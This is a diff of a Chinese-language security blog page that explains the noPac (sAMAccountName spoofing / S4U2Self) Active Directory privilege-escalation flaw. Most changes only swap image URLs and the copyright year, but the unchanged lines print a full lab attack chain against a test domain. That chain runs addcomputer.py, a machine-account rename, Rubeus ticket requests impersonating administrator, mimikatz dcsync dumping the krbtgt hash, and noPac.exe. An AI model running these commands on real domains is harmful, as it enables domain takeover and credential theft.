@@ -225,16 +225,16 @@
 <h3 id="1-kerberos处理username缺陷">1. Kerberos处理username缺陷</h3>
 <p><a href="https://github.com/KernelPanic-OpenSource/Win2K3_NT_ds/blob/0d97393773ee5ecdc29aae15023492e383f7ee7f/security/protocols/kerberos/server/tktutil.cxx" target="_blank" rel="noopener">Kerberos_winxp</a></p>
 <p>首先，如果找不到 UserName 的话，KDC会继续查找 UserName$</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pmv846nj20xq0u0q5y.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241437370.jpg" alt="img"></p>
 <p>如果还是查找不到的话，KDC会继续查找altSecurityIdentities属性的值的用户。</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pn6p67ij212f0u0tby.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241437547.jpg" alt="img"></p>
 <p>根据此漏洞我们想伪造域控机器账号随后让KDC找不到username后自动使用域控机器名(DC$)</p>
 <p>触发KDC找不到username主要有两种方式：</p>
 <ol>
 <li>跨域请求：跨域请求时，目标域活动目录数据库是找不到其他域的用户的，因此会走进这个处理UserName的逻辑。</li>
 <li>修改saMAccountName属性：在当前域，可以通过修改saMAccountName属性让KDC找不到用户，然后走进这个处理UserName的逻辑。</li>
 </ol>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pnbuc2bj212u0820uv.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241438688.jpg" alt="img"></p>
 <h3 id="2-利用s4u2self-生成高权限pac">2. 利用S4U2Self 生成高权限PAC</h3>
 <p>现在根据上面Kerberos查找username的缺陷我们有了可伪造域控的可能性，但是根本的认证还需要PAC的生成。</p>
 <p><strong>正常Kerberos认证PAC的生成过程：</strong></p>
@@ -242,12 +242,12 @@
 <li>KDC在收到客户端发来的AS-REQ请求后，从请求中取出cname字段，然后查询活动目录数据库，找到sAMAccountName属性为cname字段的值的用户，用该用户的身份生成一个对应的PAC。</li>
 <li>KDC在收到客户端发来TGS-REQ请求后，利用krbtgt密钥对TGT票据解密，然后取出PAC。然后验证PAC的签名，如果签名正确，则证明PAC未经过篡改。然后将TGT认购权证中的PAC直接拷贝到ST服务票据中。(图示一)</li>
 </ol>
-<p><a href="https://github.com/KernelPanic-OpenSource/Win2K3_NT_ds/blob/0d97393773ee5ecdc29aae15023492e383f7ee7f/security/protocols/kerberos/server/gettgs.cxx" target="_blank" rel="noopener">gettgs.cxx</a></p>
+<p><a href="https://i0.wp.com/github.com/KernelPanic-OpenSource/Win2K3_NT_ds/blob/0d97393773ee5ecdc29aae15023492e383f7ee7f/security/protocols/kerberos/server/gettgs.cxx" target="_blank" rel="noopener">gettgs.cxx</a></p>
 <p>正常流程中PAC生成，可以看到ST票据中的PAC直接cpoy TGT票据中的</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pnlafitj217p0u077a.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241438806.jpg" alt="img"></p>
 <p><strong>S4U2Self协议中PAC生成过程</strong></p>
 <p>KDC收到客户端发来的TGS-REQ S4U2Self协议，在验证了客户端是否具有发起S4U2Self协议权限后，会根据S4U2Self协议中模拟的用户生成对于权限的PAC，然后放在ST服务票据中，并不会复用TGT认购权证中的PAC！</p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pnpwsmrj20x70u0q5x.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241438696.jpg" alt="img"></p>
 <p>所以我们发现在正常的Kerberos认证过程中，ST票据种的PAC是直接从TGT票据种copy过来的，那么在S4U2Self请求中，PAC是重新生成的。</p>
 <h2 id="0x03-漏洞利用">0x03 漏洞利用</h2>
 <p>在针对以上问题之后我们可以发现一条完善的攻击链：</p>
@@ -259,32 +259,32 @@
 <h3 id="1-手动实现">1. 手动实现</h3>
 <p>创建机器用户</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 addcomputer.py -computer-name <span class="string">"machine"</span> -computer-pass <span class="string">"123456"</span> -dc-ip 192.168.40.132 spanning-tree.org/lisi:<span class="string">"123456"</span> -method SAMR -debug</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47ppby6nlj22n406cdhw.jpg" alt="img"></p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47ppaahkyj21bn0u0n4o.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241438970.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241438300.jpg" alt="img"></p>
 <p>修改机器用户sAMAccountName为域控机器名(不带$)</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 renameMachine.py -current-name <span class="string">"machine$"</span> -new-name <span class="string">"WIN-SJD97LJQLJP"</span> -dc-ip WIN-SJD97LJQLJP.spanning-tree.org spanning-tree.org/lisi:<span class="string">"123456"</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pp5tysfj22fi060wgp.jpg" alt="img"></p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pp2pmuoj22ch0u04an.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241438740.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241438358.jpg" alt="img"></p>
 <p>申请TGT票据</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:<span class="string">"WIN-SJD97LJQLJP"</span> /password:<span class="string">"123456"</span> /domain:<span class="string">"spanning-tree.org"</span> /dc:<span class="string">"WIN-SJD97LJQLJP.spanning-tree.org"</span> /nowrap /ptt</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47powtoyvj22f20u04b0.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241438722.jpg" alt="img"></p>
 <p>将之前创建的机器用户sAMAccountName修改为原先的机器名称(这一步为了Kerberos在处理username的时候找不到机器名，便自动使用域控$名)</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 renameMachine.py -current-name <span class="string">"WIN-SJD97LJQLJP"</span> -new-name <span class="string">"machine$"</span> -dc-ip WIN-SJD97LJQLJP.spanning-tree.org spanning-tree.org/lisi:<span class="string">"123456"</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47porc01jj22lk05a40m.jpg" alt="img"></p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47poqlafxj21q30u0qc8.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241439883.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241439343.jpg" alt="img"></p>
 <p>利用S4u2Self协议请求访问ldap/WIN-SJD97LJQLJP.spanning-tree.org的ST服务票据</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /self /impersonateuser:<span class="string">"administrator"</span> /altservice:<span class="string">"ldap/WIN-SJD97LJQLJP.spanning-tree.org"</span> /dc:<span class="string">"WIN-SJD97LJQLJP.spanning-tree.org"</span> /ptt /ticket:上一步申请的TGT</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47pok7x87j21nh0u0wql.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241439487.jpg" alt="img"></p>
 <p>使用mimikatz的dcsync功能成功获取krbtgt哈希</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"lsadump::dcsync /domain:spanning-tree.org /user:krbtgt /csv"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47poecdn4j21ds0imwhx.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241439296.jpg" alt="img"></p>
 <h3 id="2-自动化工具利用">2. 自动化工具利用</h3>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">noPac.exe -domain spanning-tree.org -user lisi -pass <span class="string">"123456"</span> /dc WIN-SJD97LJQLJP.spanning-tree.org /mAccount machine /mPassword 123456 /service cifs /ptt=</span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47poaaekzj22xe0omaqi.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241439188.jpg" alt="img"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">"lsadump::dcsync /domain:spanning-tree.org /user:krbtgt /csv"</span> <span class="string">"exit"</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47po7o0y2j21jm0eqtb9.jpg" alt="img"></p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47po2ze0yj21am0feadf.jpg" alt="img"></p>
-<p><img src="https://tva1.sinaimg.cn/large/e6c9d24egy1h47po11u4xj21je07iab6.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241439640.jpg" alt="img"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/Katsec/img/202303241440144.jpg" alt="img"></p>
+<p><img src="https://i0.wp.com/tva1.sinaimg.cn/large/e6c9d24egy1h47po11u4xj21je07iab6.jpg" alt="img"></p>
 <p>扫描工具：</p>
 <p><a href="https://github.com/knightswd/NoPacScan" target="_blank" rel="noopener">https://github.com/knightswd/NoPacScan</a></p>
 <h4 id="reference">Reference</h4>
@@ -482,7 +482,7 @@
 
                 </ul>
                 <p class="copyright text-muted">
-                    Copyright &copy; Kat 2022 
+                    Copyright &copy; Kat 2023 
                     <br>
                     <span style="display: inline-block; margin: 0 5px;">
                         <i class="fa fa-heart"></i>
